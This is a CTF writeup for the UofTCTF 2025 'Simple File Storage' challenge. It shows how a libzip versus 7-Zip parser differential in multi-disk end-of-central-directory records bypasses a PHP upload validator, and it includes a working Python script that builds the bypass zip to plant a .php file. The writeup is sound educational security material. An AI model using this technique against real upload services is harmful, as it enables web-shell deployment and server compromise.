---
title: UofTCTF 2025 - Simple File Storage Writeup
publish_date: 2025-01-13
allow_iframes: true
disableHtmlSanitization: true
---

Simple file storage is a misc challenge which extracts uploaded zip files given they pass a handful of checks. Whilst the intended solution was to use a zip-tar polygot file, this writeup details the discovery and exploitation of using a single zip archive.

# Application Overview

The application is written in php, and allows us to upload a ZIP file, provided it passes the following checks:
1. Has no null-bytes in the file name
    ```php
    if (strpos($file['name'], "\0") !== false) {
        $_SESSION['message'] = 'Invalid file name.';
        header('Location: index.php');
        exit();
    }
    ```
2. Has a `.zip` extension
    ```php
    $fileExt = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if ($fileExt !== 'zip') {
    ```
3. Has the correct magic bytes
    ```php
    $f = fopen($uploadedFilePath, 'rb');
    $magicBytes = fread($f, 4);
    fclose($f);
    if ($magicBytes !== "PK\x03\x04") {
    ```
4. Opens with php's ZipArchive
    ```php
    $zip = new ZipArchive;
    if ($zip->open($uploadedFilePath) !== TRUE) {
    ```

5. For each file, contains no path traversal attempts
    ```php
    $entry = $zip->getNameIndex($i);

    $normalized = str_replace('\\', '/', $entry);

    if (strpos($normalized, '../') !== false || 
        strpos($normalized, '..\\') !== false ||
        strpos($normalized, '/') === 0) {
    ```
6. For each file, contains no null bytes in the file name
    ```php
    if (strpos($normalized, "\0") !== false) {
    ```
7. Does not contain symlinks
    ```php
    $zip->getExternalAttributesIndex($i, $opsys, $attr);
    $mode = ($attr >> 16) & 0xFFFF;
    $fileType = $mode & 0xF000;

    if ($fileType === 0xA000) {
    ```
8. And finally, contains no files with forbidden extensions
    ```php
    $forbiddenExtensions = ['php', 'phtml', 'phar', 'ht'];
    $ext = strtolower(pathinfo($baseName, PATHINFO_EXTENSION));
    foreach ($forbiddenExtensions as $forbiddenExt) {
        if (strpos($ext, $forbiddenExt) !== false) {
    ```

With this validate zip file, it will then be extracted using the 7-Zip CLI tool, validating it returns with success:
```php
exec("7z x " . escapeshellarg($uploadedFilePath) . " -o" . escapeshellarg($extractPath) . " -y", $extractOutput, $extractReturn);
if ($extractReturn !== 0) {
    exit();
}
```

From here, the goal is to call the `/readflag` binary on system, requiring code execution and not just an arbitarary read.
This being a relatively minimal php challenge, had no other ways to solve this other than the intended uploading a php web-shell contained within a zip to run system commands.

From here we notice there is a difference in the library/application used to perform all the checks, and to extract the zip archive.
Its clear 7-Zip is its own application, but php uses `libzip`, which gives rise to a parsing differential, where both tools will handle a perfectly in-spec ZIP archive correctly, but will have slight differences when we vary from the specification.

# ZIP File Structure

ZIP Files are broken down into 2 main parts - file chunks and the central directory.

The central directory is typically located at the end of the file, and file chunks near the start.

The central directory contains various bits of information about each file to create a directory listing, then has pointers to file chunks.

The end-of central directory (EOCD) block is special, and contains a pointer to the start of the central directory, along with the number of files this archive spans.

![ZIP Structure](assets/uoftctf25_simple_file_storage/zip-structure.svg)

When reading a zip file, a parser will start at the end of the file, and work its way back until it hits a valid end of central directory.
However, what two differing parsers consider valid depends on how much of the zip specificationt they implement.

# Parser Differences

7-Zip is quite happy to read multi-disk ZIP files. If we state there are multiple disks, but provide all the correct file chunks within the file, 7-Zip doesn't try load the second file as it would have no use for it.

However, if we look at the libzip code, we find a difference - libzip doesn't support multidisking.

<iframe frameborder="0" scrolling="no" width="100%" height="478px" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.
com%2Fnih-at%2Flibzip%2Fblob%2F663d481321dbe63e400685d9b0d944737e72ffb2%2Flib%2Fzip_open.c%23L789-L808&style=default&type=code&showBorder=on&showLineNumbers=on&showFileMeta=on&showFullPath=on&showCopy=on"></iframe>

Whilst this technically is a valid EOCD block, libzip rejects any multi-disking blocks, and continues searching the file for another EOCD.
In a normal file, this would yield no results and result in an error, but what if we add another EOCD for libzip to find?

# Abusing the Difference

With this difference in mind, we can construct a ZIP which looks like so:
![ZIP Structure](assets/uoftctf25_simple_file_storage/zip-payload.svg)

Whilst we dont need to upload `file.001`, we need to set the number of disks in the first EOCD to have libzip think there is another file.

This is a pretty non-standard thing to do, so we write some python code to do this:


```PY
import struct
import zipfile
ZIP_VER = 20

def make_ecd(n_cds, cds_size, cds_rel_offset, disk_count):
    return struct.pack("<LHHHHLLH",
                0x06054b50, # MAGIC
                0x0,disk_count,n_cds, n_cds,
                cds_size, cds_rel_offset,
                0)

def make_cd(file_crc32, file_size, file_name, file_offset):
    return struct.pack("<LHHHHHHLLLHHHHHLL",
                       0x02014b50,
                       ZIP_VER, 0, 0, 0, 0, 0,
                       file_crc32,
                       file_size,
                       file_size,
                       len(file_name),
                       0, 0, 0, 0, 0,
                       file_offset) + file_name

def make_file(file_name, file_data,extra_fields=dict()):
    extra_data = make_extra_data(extra_fields)
    checksum = zipfile.crc32(file_data)
    local_file_header = struct.pack("<LHHHHHLLLHH",
                                    0x04034b50,
                                    ZIP_VER, 0, 0, 0, 0, 
                                    checksum,
                                    len(file_data),
                                    len(file_data),
                                    len(file_name), 0
                                    ) + file_name + file_data
    
    return local_file_header, checksum


files = [
    (b"hexf.php", b"hexf.php", b'<?php echo "i am a php webshell"; ?>'),
]

files_2 = [
    (b"libzip file", b"libzip file", b'test')
]

cds = []
cds_2 = []

with open("file.zip", "wb") as f:
    for file in files:
        pos = f.tell()
        lfh, cs = make_file(file[0], file[2])
        cds.append(make_cd(cs, len(file[2]), file[1], pos))
        f.write(lfh)

    for file in files_2:
        pos = f.tell()
        lfh, cs = make_file(file[0], file[2])
        cds_2.append(make_cd(cs, len(file[2]), file[1], pos))
        f.write(lfh)

    cds_start = f.tell()
    for cd in cds_2:
        f.write(cd)
    cds_end = f.tell()
    f.write(make_ecd(len(cds_2),cds_end - cds_start,cds_start, 0)) 


    cds_start = f.tell()
    for cd in cds:
        f.write(cd)
    cds_end = f.tell()
    f.write(make_ecd(len(cds),cds_end - cds_start,cds_start, 1)) 

```

And we get `file.zip`, which passes all the upload checks.
This allows us to upload php files, which allows us to use a php web shell, although I leave that as an exercise to the reader.



# A Fun Bonus

libzip and 7-zip also have slightly different handling when it comes to the filenames.

A file chunk starts with a local file header, containing the following data

![LFH Layout](assets/uoftctf25_simple_file_storage/local-file-header-layout.png)

A central directory entry containds the following data

![CD Layout](assets/uoftctf25_simple_file_storage/central-directory-layout.png)

For the checks we are doing from php with libzip, only the central directory filename entries are used.
With 7zip, when extracting the filename from the local file headers are used.
However, this inconsistency raises an error within 7-Zip, but it still extracts the file.
The issue arises when the return-code is non-zero, which is a check we previously had to pass.


# Acknowledgements
Some diagrams of [Florian Buchholz's "The structure of a PKZip file"](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html) have been reproduced here.